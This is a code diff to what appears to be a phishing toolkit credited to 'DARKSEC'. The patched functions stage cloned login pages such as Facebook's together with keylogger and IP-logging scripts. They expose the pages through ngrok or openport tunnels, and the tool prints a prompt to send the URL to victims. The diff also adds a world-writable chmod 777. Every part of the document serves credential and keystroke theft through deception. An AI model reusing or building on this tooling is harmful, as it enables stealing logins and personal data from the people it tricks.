@@ -34,7 +34,10 @@ MAIN0, MAIN1, MAIN2, MAIN3, MAIN4 = colorTheme[0], colorTheme[
 
 
 def runPhishing(page, customOption):  # Phishing pages selection menu
-    system('rm -r Server/www/ && mkdir Server/www && touch Server/www/usernames.txt && touch Server/www/ip.txt && cp WebPages/ip.php Server/www/ && cp WebPages/KeyloggerData.txt Server/www/ && cp WebPages/keylogger.js Server/www/ && cp WebPages/keylogger.php Server/www/ && rm -rf link.url')
+    system('cd Server && mkdir www && chmod 777 Server -R')
+    system('rm -r Server/www/ && mkdir Server/www')
+    system('touch Server/www/usernames.txt && touch Server/www/ip.txt')
+    system('cp WebPages/ip.php Server/www/ && cp WebPages/KeyloggerData.txt Server/www/ && cp WebPages/keylogger.js Server/www/ && cp WebPages/keylogger.php Server/www/ && rm -rf link.url')
     if customOption == '1' and page == 'Facebook':
         copy_tree("WebPages/fb_standard/", "Server/www/")
     elif customOption == '2' and page == 'Facebook':
@@ -333,14 +336,15 @@ def manageOpenporturl(port):
 	print("\n{0}[{1}!{0}]{1} SEND THIS OPENPORT URL TO VICTIMS-\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}\n{0}[{1}*{0}]{1} OPENPORT URL: {2}{4}\n".format(MAIN0, MAIN4, MAIN3, port, url))
 
 def runNgrok(port):
+    system('killall -2 ngrok > /dev/null')
+    system('clear')
     print('''
         {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
         |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
         |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
         {0}http://github.com/darksecdevelopers
         {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ NGROK SERVER ]{1}!! {0}\n-------------------------------'''.format(MAIN0, MAIN2))
-
-    system('killall -2 ngrok > /dev/null 2>&1 && ./Server/ngrok http {} > /dev/null &'.format(port))
+    system('./Server/ngrok http {} > /dev/null &'.format(port))
     while True:
         sleep(2)
         system(
